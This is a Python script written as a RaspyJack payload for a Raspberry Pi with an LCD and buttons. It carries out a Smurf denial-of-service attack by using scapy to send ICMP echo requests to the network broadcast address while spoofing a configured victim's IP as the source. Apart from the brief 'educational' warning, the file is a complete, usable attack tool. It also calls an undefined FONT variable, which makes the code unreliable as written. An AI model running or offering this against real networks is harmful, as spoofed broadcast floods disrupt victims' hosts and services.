#!/usr/bin/env python3
"""
RaspyJack *payload* – **DoS Attack: Smurf Attack**
===================================================
A classic amplified Denial of Service (DoS) attack. It works by sending
ICMP Echo Requests (pings) to the network's broadcast address, while
spoofing the source IP to be the victim's IP address.

All hosts on the network that respond to broadcast pings will then send
an ICMP Echo Reply to the victim, overwhelming it with traffic.

**!!! WARNING !!!**
This is a DENIAL OF SERVICE attack. Most modern, well-configured
networks are immune to this. It is included for educational purposes.
Use with extreme caution.
"""

import os, sys, subprocess, signal, time, threading
sys.path.append(os.path.abspath(os.path.join(__file__, '..', '..')))
import RPi.GPIO as GPIO
import LCD_1in44, LCD_Config
from PIL import Image, ImageDraw, ImageFont

try:
    from scapy.all import *
    conf.verb = 0
except ImportError:
    sys.exit(1)

# --- CONFIGURATION ---
# The IP of the victim you want to flood
VICTIM_IP = "192.168.1.100" 

# --- GPIO & LCD ---
PINS = { "OK": 13, "KEY3": 16 }
GPIO.setmode(GPIO.BCM)
for pin in PINS.values(): GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)
LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
FONT_TITLE = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 12)
FONT_STATUS = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 16)

# --- Globals & Shutdown ---
running = True
attack_thread = None
attack_stop_event = threading.Event()
packet_count = 0
broadcast_ip = None

def cleanup(*_):
    global running
    if running:
        running = False
        attack_stop_event.set()

signal.signal(signal.SIGINT, cleanup)
signal.signal(signal.SIGTERM, cleanup)

# --- UI ---
def draw_ui(status: str):
    img = Image.new("RGB", (128, 128), "black")
    d = ImageDraw.Draw(img)
    d.text((5, 5), "Smurf Attack", font=FONT_TITLE, fill="#FF0000")
    d.line([(0, 22), (128, 22)], fill="#FF0000", width=1)
    status_color = "lime" if status == "ACTIVE" else "red"
    d.text((30, 35), status, font=FONT_STATUS, fill=status_color)
    d.text((5, 60), "Packets Sent:", font=FONT, fill="white")
    d.text((15, 75), str(packet_count), font=FONT_TITLE, fill="yellow")
    d.text((5, 110), "OK=Start/Stop | KEY3=Exit", font=FONT, fill="cyan")
    LCD.LCD_ShowImage(img, 0, 0)

# --- Attack Logic ---
def smurf_worker():
    global packet_count
    if not broadcast_ip:
        print("Error: Broadcast IP not found.", file=sys.stderr)
        return

    # We are sending a ping from VICTIM_IP to the broadcast address
    p = IP(src=VICTIM_IP, dst=broadcast_ip) / ICMP()
    
    while not attack_stop_event.is_set():
        send(p, iface="eth0", verbose=0)
        packet_count += 1
        time.sleep(0.5) # Don't overwhelm the local CPU

def start_attack():
    global attack_thread, packet_count
    if not (attack_thread and attack_thread.is_alive()):
        packet_count = 0
        attack_stop_event.clear()
        attack_thread = threading.Thread(target=smurf_worker, daemon=True)
        attack_thread.start()

def stop_attack():
    attack_stop_event.set()
    if attack_thread:
        attack_thread.join(timeout=2)

# --- Main Loop ---
try:
    is_attacking = False
    # Get broadcast IP from ifconfig
    broadcast_ip = subprocess.check_output("ifconfig eth0 | grep -oP 'broadcast \\K\\S+'", shell=True).decode().strip()
    if not broadcast_ip:
        draw_ui("No Broadcast IP!")
        time.sleep(3)
        raise SystemExit("Could not determine broadcast IP.")

    while running:
        draw_ui("ACTIVE" if is_attacking else "STOPPED")
        
        start_wait = time.time()
        while time.time() - start_wait < 1.0:
            if GPIO.input(PINS["KEY3"]) == 0:
                cleanup()
                break
            if GPIO.input(PINS["OK"]) == 0:
                is_attacking = not is_attacking
                if is_attacking:
                    start_attack()
                else:
                    stop_attack()
                time.sleep(0.3)
                break
            time.sleep(0.05)
        if not running: break
except (KeyboardInterrupt, SystemExit):
    pass
finally:
    cleanup()
    LCD.LCD_Clear()
    GPIO.cleanup()
    print("Smurf Attack payload finished.")
